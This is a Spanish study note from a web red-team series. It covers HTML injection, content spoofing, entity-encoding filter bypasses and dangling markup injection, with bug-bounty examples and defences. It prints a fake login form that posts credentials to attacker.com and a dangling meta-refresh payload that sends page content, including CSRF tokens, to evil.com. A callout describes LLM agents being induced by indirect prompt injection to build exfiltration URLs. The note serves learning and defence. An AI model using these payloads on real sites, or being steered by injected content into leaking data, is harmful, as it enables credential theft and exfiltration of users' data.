---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Descripción: "La *HTML injection* y el *content spoofing* inyectan contenido en el HTML de la página sin ejecutar JavaScript — el primo 'sin JS' del XSS. En aislado son de impacto bajo…"
Fecha de actualización: 2026-07-27
Nota previa: "[[10 - XSS en frameworks modernos]]"
Nota siguiente:
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

<mark style="background: #ADCCFFA6;">La *HTML injection* y el *content spoofing* inyectan contenido en el HTML de la página **sin ejecutar JavaScript**</mark> — el primo "sin JS" del [[00 - Introducción a XSS|XSS]]. En aislado son de impacto bajo (phishing, *virtual defacement*), pero una de sus técnicas —el *dangling markup injection*— escala a **exfiltración de datos** cuando el XSS completo está bloqueado, y por eso merece sitio en el arsenal avanzado.

# HTML injection vs content spoofing

- <mark style="background: #ADCCFFA6;">**HTML injection**</mark>: el sitio renderiza etiquetas HTML que envías (vía input o parámetro) sin sanear. Sin JS no hay XSS, pero sí puedes colar un `<form>` de login falso que apunte a tu servidor:

```html
<form method='POST' action='https://attacker.com/capture.php'>
  <input name='username'><input type='password' name='password'>
  <input type='submit'>
</form>
```

  La víctima reintroduce credenciales creyendo que es el sitio real → *phishing*.

- **Content spoofing** (*text injection*): el sitio **escapa o quita** las etiquetas, así que solo cuela **texto plano**. <mark style="background: #FFB8EBA6;">Impacto más bajo (puro social engineering)</mark> — insertar un mensaje tipo "Tu cuenta ha sido hackeada, llama a este número". Muchos programas lo marcan `N/A`; depende de que la víctima se crea el texto.

# Bypass por character encoding

Un filtro que quita `<` y `>` pero **decodifica entidades HTML** cae con la entrada codificada. Si envías `&#60;h1&#62;` (o `&lt;h1&gt;`) y el servidor lo decodifica **después** de filtrar, renderiza la etiqueta:

```text
&#60;h1&#62;This is a test&#60;/h1&#62;   →   <h1>This is a test</h1>
```

<mark style="background: #FF5582A6;">Regla: prueba siempre plaintext **y** codificado</mark> (entidades decimales/hex, URL-encoding, doble encoding). Es el caso Coinbase ($200): filtraban etiquetas pero decodificaban entidades, y con valores HTML-encoded se renderizó un `<form>` de credenciales. [CyberChef](https://gchq.github.io/CyberChef/) genera las variantes.

# Dangling markup injection

La técnica que convierte una HTML injection "inofensiva" en robo de datos, útil <mark style="background: #FFB86CA6;">cuando puedes inyectar markup pero no ejecutar JS</mark> (sanitización parcial, o CSP que bloquea scripts pero no la navegación). La idea: inyectar una etiqueta con un **atributo sin cerrar** que "engulle" el HTML de la página hasta la siguiente comilla y lo manda a tu servidor. El vector clásico es un `<meta>` refresh con comilla colgante:

```html
<meta http-equiv="refresh" content="0; url=https://evil.com/log?text=
```

Todo lo que hay entre esa comilla y la siguiente comilla del documento viaja como parámetro `text` en el `GET` a `evil.com` — <mark style="background: #8000E1A6;">incluido un token CSRF en un campo oculto</mark>. Es exactamente el caso HackerOne ($500, Inti De Ceukelaire): un editor Markdown mal configurado dejaba inyectar una comilla colgante en un `<meta>`, y FileDescriptor documentó la exfiltración vía `<meta>` refresh.

> [!warning]+ Modernización: qué lo frena hoy
> El dangling markup ha perdido fuelle pero **no está muerto**. Una [[04 - Content Security Policy (CSP)|CSP]] estricta corta los vectores que **cargan un recurso externo** (`img-src`/`style-src`/`connect-src` frenan el `<img src>`, la CSS o el `fetch` que exfiltran), y los navegadores modernos bloquean algunos de ellos. Pero la exfiltración por **navegación** (`<meta http-equiv="refresh">`, `<link>`) no la frena de forma fiable —la directiva `navigate-to` se retiró de la spec CSP—, y por eso ese sink es el que sobrevive, junto con las defensas mal configuradas ([PortSwigger — Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)).

> [!info]+ La misma primitiva, actor nuevo
> Los ataques de exfiltración contra agentes LLM de 2025-2026 son dangling markup con otro autor de la etiqueta. En [[06 - EchoLeak y la exfiltración zero-click|EchoLeak (CVE-2025-32711)]], `ForcedLeak` y `CamoLeak`, quien construye la URL con los datos dentro **es el propio modelo**, inducido por [[05 - Inyección indirecta en RAG, email y web|prompt injection indirecta]]. El sink es idéntico —un recurso remoto que el cliente carga solo— y también lo es la defensa: no renderizar recursos externos con datos variables en la URL.

# Cazarlo y defender

Al [[04 - Descubrimiento de XSS|descubrir XSS]], vigila **parámetros reflejados en el HTML** aunque no ejecuten JS: si `?error=access_denied` se renderiza en la página (caso Within Security, $250: un `error` de WordPress mostraba texto arbitrario sobre el login → mensaje de "cuenta hackeada"), tienes al menos content spoofing y quizá dangling markup.

Defensa: escapar/sanear todo HTML de usuario (React escapa por defecto; el peligro es `dangerouslySetInnerHTML` sin sanear); **CSP** para cortar la exfiltración; y —clave— servir el **token CSRF en una cabecera, no en un campo del formulario**, para que un dangling markup no lo capture.
